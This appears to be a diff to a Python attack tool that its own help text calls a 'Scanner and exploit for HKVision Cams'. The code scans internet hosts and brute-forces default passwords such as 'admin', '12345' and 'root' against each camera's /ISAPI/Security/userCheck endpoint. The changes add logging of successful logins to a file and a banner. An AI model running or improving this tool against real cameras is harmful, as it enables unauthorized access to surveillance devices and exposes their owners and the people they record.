@@ -7,6 +7,7 @@ def convertoToBase64(value):
     encoded_data = base64.b64encode(value.encode('utf-8'))
     return encoded_data.decode('utf-8')
 def brute(ip, port):
+    file = open("found-users.txt", "w")
     password = ["admin", "12345", "root"]
     user = 'admin'
     link=""
@@ -30,9 +31,11 @@ def brute(ip, port):
         'Connection': 'close'}
         req = requests.post(host+'/ISAPI/Security/userCheck', headers=headers)
         if req.status_code == 200:
-            print("Found user: " + user+"-"+str(i))
+            print("[!] Found user: " + user+"-"+str(i))
+            file.write("[!] Found user: " + user+"-"+str(i))
         else:
             print("[+] "+user+":"+i+" - Incorrect!")
+    file.close()
 
 
 
@@ -53,7 +56,14 @@ def scan(mbrute, token):
             brute(str(ip), str(port))
     
 
+def banner():
+    print('    ______       __    __  __ ____ __ __ _    __ _        _             ')
+    print('   / ____/_____ / /__ / / / //  _// //_/| |  / /(_)_____ (_)____   ____ ')
+    print('  / /_   / ___// //_// /_/ / / / / ,<   | | / // // ___// // __ \\ / __ \\')
+    print(' / __/  / /__ / ,<  / __  /_/ / / /| |  | |/ // /(__  )/ // /_/ // / / /')
+    print('/_/     \\___//_/|_|/_/ /_//___//_/ |_|  |___//_//____//_/ \\____//_/ /_/ \n')
 
+banner()
 parser = argparse.ArgumentParser(description='Scanner and exploit for HKVision Cams')
 required = parser.add_mutually_exclusive_group(required=True)
 required.add_argument('-s', '--scan', action='store_true', help='Only scan hosts on the internet')
